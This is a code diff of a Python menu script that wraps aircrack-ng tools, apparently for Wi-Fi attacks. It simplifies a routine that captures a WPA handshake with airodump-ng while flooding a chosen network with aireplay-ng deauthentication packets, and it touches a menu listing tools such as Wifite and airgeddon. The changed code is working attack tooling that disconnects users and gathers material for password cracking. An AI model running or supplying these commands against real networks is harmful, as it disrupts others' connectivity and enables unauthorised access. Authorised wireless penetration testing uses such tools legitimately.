@@ -68,34 +68,16 @@ def intro():
         geny      = os.system(order)
         print("\nEnter the bssid of the network?")
         bssid     = str(input(""))
-        print("\nis there a client ?(yes/no)")
-        ask = str(input(""))
-        if ask == "yes":
-           print("Enter the mac of the client?")
-           client = str(input(""))
-           print("\nEnter the channel of the network?")
-           channel   = int(input())
-           print("\nThis HandShake File in path: /root/Desktop/target.cap")
-           cmd1 = os.system("sleep 4")
-           print("\nEnter the number of the packets [1-10000] ( 0 for unlimited number)")
-           print("the number of the packets Depends on the Distance Between you and the network")
-           dist = int(input(""))
-           order1    = "xterm -T Attacking the network -e aireplay-ng -0 {} -a {} {} | xterm -0 0 -e aireplay-ng -a {} -c {} {} ".format(dist,bssid,interface,bssid,client,interface)
-           geny   = os.system(order1)
-           order2    = "xterm -T Getting Handshake -e airodump-ng {} --bssid {} -c {} -w /root/Desktop/target -M".format(interface,bssid,channel)
-           geny2 = os.system(order2)
-           intro()
-        else:
-           print("\nEnter the channel of the network?")
-           channel   = int(input())
-           print("\nThis HandShake File in path: /root/Desktop/target.cap")
-           cmd1 = os.system("sleep 4")
-           print("\nEnter the number of the packets [1-10000] ( 0 for unlimited number)")
-           print("the number of the packets Depends on the Distance Between you and the network")
-           dist = int(input(""))
-           order    = "xterm -T Getting Handshake -e airodump-ng {} --bssid {} -c {} -w /root/Desktop/target -M | xterm -T Attacking the network -e aireplay-ng -0 {} -a {} {}".format(interface,bssid,channel,dist,bssid,interface)
-           geny     = os.system(order)
-           intro()
+        print("\nEnter the channel of the network?")
+        channel   = int(input())
+        print("\nThis HandShake File in path: /root/Desktop/target.cap")
+        cmd1 = os.system("sleep 4")
+        print("\nEnter the number of the packets [1-10000] ( 0 for unlimited number)")
+        print("the number of the packets Depends on the Distance Between you and the network")
+        dist = int(input(""))
+        order = "airodump-ng {} --bssid {} -c {} -w /root/Desktop/target | xterm -e aireplay-ng -0 {} -a {} {}".format(interface,bssid,channel,dist,bssid,interface)
+        geny = os.system(order)
+        intro()
     elif var == 5 :
         def wire():
             cmd = os.system("clear")
@@ -118,6 +100,7 @@ def intro():
 16) Wifite                              32) Back to main menu
 90) airgeddon
 91) wifite v2
+
 0)install all wireless tools
 """)
             w = int(input("Enter The number of the tool : >>> "))
